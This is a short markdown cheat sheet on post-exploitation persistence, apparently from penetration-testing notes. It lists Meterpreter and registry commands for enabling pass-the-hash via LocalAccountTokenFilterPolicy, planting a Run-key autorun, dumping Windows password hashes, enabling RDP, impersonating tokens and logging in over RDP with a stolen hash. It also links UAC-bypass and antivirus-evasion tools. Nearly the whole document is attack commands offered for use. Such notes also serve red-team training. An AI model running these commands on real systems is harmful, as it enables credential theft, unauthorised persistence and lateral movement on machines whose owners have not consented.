# Persistence

## [⬅ Back to Index](../README.md)

---

## General

### Metasploit (General)

* Execute programs - `execute -f /program -i -c`
* Local Port forward - `portfwd add -l 8080 -p 80 -r x.x.x.x`

## Windows

### Enable psexec usage (Pass-The-Hash)

* `reg setval -k 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1`

### Autorun

* `reg setval -k HKLM\software\microsoft\windows\currentversion\run -d "<exe>" -v <name>`

### Metasploit (Win)

* Dump hashes:
  * `hashdump`
  * `run post/windows/gather/smart_hashdump`
* Enable RDP (currently supported method) - `run post/windows/manage/enable_rdp`
* Impersonation - `use incognito` -> `list_tokens -u` -> `impersonate_token <delegate>`

### Other Scripts / Git Resources

* [UACME - UAC Bypass Techniques](https://github.com/hfiref0x/UACME)
* [Veil-Evasion (Veil 3+)](https://github.com/Veil-Framework/Veil)
* RDP Clients for Linux:
  * `rdesktop`
  * `xfreerdp /u:user /pth:<hash> /v:x.x.x.x` (RDP with Pass-The-Hash functionality - "freerdp-x11" in package manager)
